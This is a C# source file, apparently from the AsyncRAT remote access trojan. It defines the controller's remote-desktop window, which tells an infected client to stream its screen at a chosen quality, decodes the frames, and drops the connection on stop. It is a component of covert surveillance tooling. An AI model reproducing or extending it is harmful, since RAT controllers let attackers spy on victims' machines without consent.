using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AsyncRAT_Sharp.Sockets;
using AsyncRAT_Sharp.MessagePack;
using System.Threading;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormRemoteDesktop : Form
    {
        public FormRemoteDesktop()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }
        internal Clients C2 { get; set; }
        public bool Active { get; set; }
        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public Stopwatch RenderSW = Stopwatch.StartNew();
        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (panel1.Visible == false)
            {
                panel1.Visible = true;
                button2.Top = panel1.Bottom + 5;
                button2.BackgroundImage = Properties.Resources.arrow_up;
            }
            else
            {
                panel1.Visible = false;
                button2.Top = pictureBox1.Top + 5;
                button2.BackgroundImage = Properties.Resources.arrow_down;
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            button2.Top = panel1.Bottom + 5;
            button2.PerformClick();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (button1.Text == "START")
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
                decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                numericUpDown1.Enabled = false;
                button1.Text = "STOP";
            }
            else
            {
                button1.Text = "START";
                numericUpDown1.Enabled = true;
                try
                {
                    C2.ClientSocket.Dispose();
                    C2.Disconnected();
                    C2 = null;
                }
                catch { }
            }
        }

        private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
        {
            button2.Left = pictureBox1.Width / 2;
        }
        //private void RemoteDesktop_Activated(object sender, EventArgs e)
        //{
        //    //if (Active == false)
        //    //{
        //    //    Active = true;
        //    //    MsgPack msgpack = new MsgPack();
        //    //    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
        //    //    msgpack.ForcePathObject("Option").AsString = "true";
        //    //    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
        //    //    decoder = new UnsafeStreamCodec(60);
        //    //}
        //}

        //private void RemoteDesktop_Deactivate(object sender, EventArgs e)
        //{
        //   // if (Active == true) Active = false;
        //}
    }
}
